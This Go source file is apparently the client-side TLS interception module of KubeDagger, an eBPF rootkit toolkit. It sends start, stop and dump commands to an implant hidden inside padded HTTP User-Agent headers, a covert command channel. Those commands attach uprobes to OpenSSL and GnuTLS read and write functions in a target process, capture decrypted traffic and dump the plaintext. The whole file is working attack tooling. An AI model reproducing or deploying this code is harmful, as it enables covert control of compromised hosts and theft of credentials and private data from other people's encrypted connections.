package tls_intercept

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type TLSResult struct {
	Action  string       `json:"action"`
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, action, targetPID, lib, output string) error {
	var result *TLSResult

	switch action {
	case "start":
		result = startCapture(target, targetPID, lib)
	case "stop":
		result = stopCapture(target, targetPID)
	case "dump":
		result = dumpCapture(target, targetPID)
	default:
		return fmt.Errorf("unsupported action: %s (use start, stop, or dump)", action)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func startCapture(target, pid, lib string) *TLSResult {
	result := &TLSResult{Action: "start"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"attach_ssl_read_uprobe",
			"attach uprobe to SSL_read/gnutls_record_recv to capture decrypted inbound data",
			"tls_attach_read",
		},
		{
			"attach_ssl_write_uprobe",
			"attach uprobe to SSL_write/gnutls_record_send to capture plaintext outbound data",
			"tls_attach_write",
		},
		{
			"configure_ringbuf_capture",
			"initialize ring buffer map for streaming captured TLS data to userspace",
			"tls_init_ringbuf",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + pid + "#" + lib
		status := sendTLSCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func stopCapture(target, pid string) *TLSResult {
	result := &TLSResult{Action: "stop"}

	cmd := "tls_detach_all#" + pid
	status := sendTLSCommand(target, cmd)
	result.Actions = append(result.Actions, ActionInfo{
		Name:   "detach_uprobes",
		Status: status,
		Detail: "detach all TLS uprobes from target process",
	})

	result.Success = allSucceeded(result.Actions)
	return result
}

func dumpCapture(target, pid string) *TLSResult {
	result := &TLSResult{Action: "dump"}

	cmd := "tls_dump_ringbuf#" + pid
	status := sendTLSCommand(target, cmd)
	result.Actions = append(result.Actions, ActionInfo{
		Name:   "dump_captured_data",
		Status: status,
		Detail: "read captured plaintext from ring buffer",
	})

	result.Success = allSucceeded(result.Actions)
	return result
}

func sendTLSCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/tls_intercept", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
